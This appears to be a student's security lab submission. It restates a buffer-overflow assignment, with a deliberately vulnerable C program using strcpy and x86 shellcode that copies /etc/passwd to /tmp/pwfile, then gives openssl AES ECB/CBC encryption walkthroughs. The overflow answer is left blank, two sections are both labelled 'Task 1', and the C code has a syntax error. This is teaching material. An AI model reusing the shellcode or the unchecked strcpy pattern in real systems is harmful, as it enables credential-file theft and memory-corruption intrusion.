# Lab #1,22110046, Mai Duc Kien, INSE331280E_01FIE
# Task 1: Software buffer overflow attack
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>
void redundant_code(char* p)
{
    local[256];
    strncpy(local,p,20);
	printf("redundant code\n");
}
int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode source in asm. This shellcode copy /etc/passwd to /tmp/pwfile
```
global _start
section .text
_start:
    xor eax,eax
    mov al,0x5
    xor ecx,ecx
    push ecx
    push 0x64777373 
    push 0x61702f63
    push 0x74652f2f
    lea ebx,[esp +1]
    int 0x80

    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    push WORD 0xffff
    pop edx
    int 0x80
    mov esi,eax

    push 0x5
    pop eax
    xor ecx,ecx
    push ecx
    push 0x656c6966
    push 0x74756f2f
    push 0x706d742f
    mov ebx,esp
    mov cl,0102o
    push WORD 0644o
    pop edx
    int 0x80

    mov ebx,eax
    push 0x4
    pop eax
    mov ecx,edi
    mov edx,esi
    int 0x80

    xor eax,eax
    xor ebx,ebx
    mov al,0x1
    mov bl,0x5
    int 0x80

```
**Question 1**:
- Compile asm program and C program to executable code. 
- Conduct the attack so that when C program is executed, the /etc/passwd file is copied to /tmp/pwfile. You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**: Must conform to below structure:




















































# Task 1: Encrypt and Decrypt Text file
This lab explores various encryption algorithm with openssl
**Question 1**: Exploration of various encryption with openssl
**Answer 1**:
## 1. Create a text file named `plain.txt`:
*First, we write a message and save it in a text file:*<br>

```sh
echo "Sir, when will we meet again?...When the dandelions bloom, my dear." > plain.txt
```
Verify current folder for newly created file

## 2. Encrypt the file using AES-256 in ECB mode:

```sh
openssl enc -aes-256-ecb -nosalt -in plain.txt -out ecb_encrypted.txt -K 00112233445566778899AABBCCDDEEFF00112233445566778899AABBCCDDEEFF
``` 
<img width="500" alt="Screenshot" src="https://github.com/AlexanderSlokov/Security-Labs-Submission/blob/main/asset/encryptingLargeMessage1.png?raw=true"><br>

Cyphertext can clearly be seen in the screenshot.

## 3. View the encrypted file using `xxd`:

```sh
xxd ecb_encrypted.txt
```

<img width="500" alt="Screenshot" src="https://github.com/AlexanderSlokov/Security-Labs-Submission/blob/main/asset/encryptingLargeMessage2.png?raw=true"><br>

Hex bytes of encrypted file can clearly be seen in the screenshot.

## 4. Decrypt the file:

```sh
openssl enc -d -aes-256-ecb -nosalt -in ecb_encrypted.txt -out ecb_decrypted.txt -K 00112233445566778899AABBCCDDEEFF00112233445566778899AABBCCDDEEFF
```

<img width="500" alt="Screenshot" src="https://github.com/AlexanderSlokov/Security-Labs-Submission/blob/main/asset/encryptingLargeMessage3.png?raw=true"><br>

The origin content can be seen after decryption in the screenshot.
## 5. **For CBC mode**:

- Encrypt:

```sh
openssl enc -aes-256-cbc -nosalt -in plain.txt -out cbc_encrypted.txt -K 00112233445566778899AABBCCDDEEFF00112233445566778899AABBCCDDEEFF -iv 0102030405060708090A0B0C0D0E0F10
```

<img width="500" alt="Screenshot" src="https://github.com/AlexanderSlokov/Security-Labs-Submission/blob/main/asset/encryptingLargeMessage4.png?raw=true"><br>


<img width="500" alt="Screenshot" src="https://github.com/AlexanderSlokov/Security-Labs-Submission/blob/main/asset/encryptingLargeMessage5.png?raw=true"><br>


- Decrypt:

```sh
openssl enc -d -aes-256-cbc -nosalt -in cbc_encrypted.txt -out cbc_decrypted.txt -K 00112233445566778899AABBCCDDEEFF00112233445566778899AABBCCDDEEFF -iv 0102030405060708090A0B0C0D0E0F10
```


<img width="500" alt="Screenshot" src="https://github.com/AlexanderSlokov/Security-Labs-Submission/blob/main/asset/encryptingLargeMessage6.png?raw=true"><br>

# Task 2. Encryption Mode – ECB vs. CBC
This lab compares the behaviour of ECB and CBC encryption modes
**Question 1**: Exploration of various ECB & CBC  with openssl
**Answer 1**:
## 1. Download the bitmap file `origin.bmp`.


## 2. Split the file into header and body:

```sh
dd if=origin.bmp of=header.bin bs=1 count=54
dd if=origin.bmp of=body.bin bs=1 skip=54
```

<img width="500" alt="Screenshot" src="https://github.com/AlexanderSlokov/Security-Labs-Submission/blob/main/asset/encryptingLargeMessage7.png?raw=true"><br>


## 3. Encrypt the body using CBC mode:

<span>*I reused the KEY and IV values from the first task, just to make sure the consistency.*</span><br>

```sh
openssl enc -aes-256-cbc -nosalt -in body.bin -out encrypted_body.bin -K 00112233445566778899AABBCCDDEEFF00112233445566778899AABBCCDDEEFF -iv 0102030405060708090A0B0C0D0E0F10
```

<span>*After using the `cat` command to look at the `encrypted_body.bin`, we can see it was fully encrypted.*</span><br>

<img width="500" alt="Screenshot" src="https://github.com/AlexanderSlokov/Security-Labs-Submission/blob/main/asset/encryptingLargeMessage8.png?raw=true"><br>

## 4. Combine the header and encrypted body:

```sh
cat header.bin encrypted_body.bin > partially_encrypted.bmp
```

<img width="500" alt="Screenshot" src="https://github.com/AlexanderSlokov/Security-Labs-Submission/blob/main/asset/encryptingLargeMessage9.png?raw=true"><br>
